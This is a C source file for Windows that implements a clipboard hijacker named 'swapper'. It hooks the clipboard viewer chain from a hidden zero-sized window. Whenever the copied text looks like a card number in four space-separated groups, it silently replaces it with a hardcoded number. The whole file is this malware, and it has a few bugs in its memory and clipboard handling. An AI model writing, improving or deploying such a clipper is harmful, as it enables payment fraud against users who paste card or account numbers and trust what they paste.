#include <windows.h>
#include <stdio.h>
const char g_szClassName[] = "swapper";
char number[20] = "1111 2222 3333 4444";
static HWND hwndNxtVwr;
short isPatternMatching(char* text, char*pattern) {
    if (strlen(text) == strlen(pattern)) {
        for (int i = 1; i < strlen(text); i++) {
            if (i % 5 == 4 && text[i] != (char)(32))
                return 0;
        }
        return 1;
    }
    return 0;
}
LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
{
    switch (msg) {
    case WM_CREATE:
        hwndNxtVwr = SetClipboardViewer(hwnd);
        break;

    case WM_DRAWCLIPBOARD:
        if (hwndNxtVwr != NULL)
        {
            SendMessage(hwndNxtVwr, msg, wParam, lParam);
        }
        if (IsClipboardFormatAvailable(CF_TEXT)) { //check for ANSI text
            OpenClipboard(hwnd);
            HANDLE hData = GetClipboardData(CF_TEXT);
            if (hData != NULL) {
                char* pszText = (char*)(GlobalLock(hData));
                if (pszText != 0 && isPatternMatching(pszText, number) == 1) {
                    GlobalUnlock(hData);
                    HANDLE h = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 20);
                    if (!h) return 1;
                    strcpy_s((char*)h, 20, number);
                    EmptyClipboard();
                    SetClipboardData(CF_TEXT, h);
                    HeapFree(h, 0, 0);
                }
                GlobalUnlock(hData);
            }
            CloseClipboard();
        }
        break;

    case WM_CHANGECBCHAIN:
        if ((HWND)wParam == hwndNxtVwr)
        {
            hwndNxtVwr = (HWND)lParam;
        }
        else
        {
            if (hwndNxtVwr != NULL)
            {
                SendMessage(hwndNxtVwr, msg, wParam, lParam);
            }
        }
        break;

    case WM_CLOSE:
        DestroyWindow(hwnd);
        break;

    case WM_DESTROY:
        ChangeClipboardChain(hwnd, hwndNxtVwr);
        PostQuitMessage(0);
        break;

    default:
        return DefWindowProc(hwnd, msg, wParam, lParam);
    }

    return 0;
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
    WNDCLASSEX wc;
    HWND hwnd;

    wc.cbSize = sizeof(WNDCLASSEX);
    wc.style = 0;
    wc.lpfnWndProc = WndProc;
    wc.cbClsExtra = 0;
    wc.cbWndExtra = 0;
    wc.hInstance = hInstance;
    wc.hIcon = LoadIcon(NULL, IDI_APPLICATION);
    wc.hCursor = LoadCursor(NULL, IDC_ARROW);
    wc.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
    wc.lpszMenuName = NULL;
    wc.lpszClassName = g_szClassName;
    wc.hIconSm = LoadIcon(NULL, IDI_APPLICATION);

    if (!RegisterClassEx(&wc))
    {
        MessageBox(NULL, "Window Registration Failed!", "Error!", MB_ICONEXCLAMATION | MB_OK);
        return 0;
    }

    hwnd = CreateWindowEx(
        WS_EX_CLIENTEDGE,
        g_szClassName,
        " ",
        WS_OVERLAPPEDWINDOW,
        CW_USEDEFAULT, CW_USEDEFAULT, 0, 0,
        NULL, NULL, hInstance, NULL);

    if (hwnd == NULL)
    {
        MessageBox(NULL, "Window Creation Failed!", "Error!",
            MB_ICONEXCLAMATION | MB_OK);
        return 0;
    }

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0) > 0)
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    return msg.wParam;
}